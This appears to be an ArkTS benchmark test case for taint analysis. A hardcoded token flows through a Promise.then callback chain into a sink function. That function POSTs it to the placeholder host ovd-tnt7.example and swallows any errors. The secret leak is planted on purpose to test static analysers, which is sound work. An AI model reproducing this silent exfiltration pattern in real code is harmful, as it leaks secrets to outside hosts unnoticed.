// VULN: OVD-TNT-007 污点经 Promise.then 回调链跳转（CWE-200）
// source → mid → sink 以具名函数挂入 then 链，数据经回调参数传递——
// 调用边由 Promise 语义建立，静态调用图需要回调边补全。孪生 007S 同构仅聚合。
import http from '@ohos.net.http';

export const TNT7_TOKEN = 'tnt7_tok_ovd_92e410';

export function ovdT7Source(): string {
  return TNT7_TOKEN;
}

export function ovdT7Mid(seed: string): string {
  return `mid(${seed.length}):${seed}`;
}

export async function ovdT7Sink(payload: string): Promise<string> {
  const req: http.HttpRequest = http.createHttp();
  try {
    await req.request('https://ovd-tnt7.example/ingest', {
      method: http.RequestMethod.POST,
      header: { 'x-tnt7-flow': '1' },
      extraData: payload
    });
  } catch (e) {
    // graceful：基准端点不可达属预期
  } finally {
    req.destroy();
  }
  return 'tnt7 then-sink posted';
}

export async function ovdTnt007(): Promise<string> {
  try {
    await Promise.resolve(ovdT7Source()).then(ovdT7Mid).then(ovdT7Sink);
  } catch (e) {
    // graceful
  }
  return 'tnt7 then-chain completed';
}
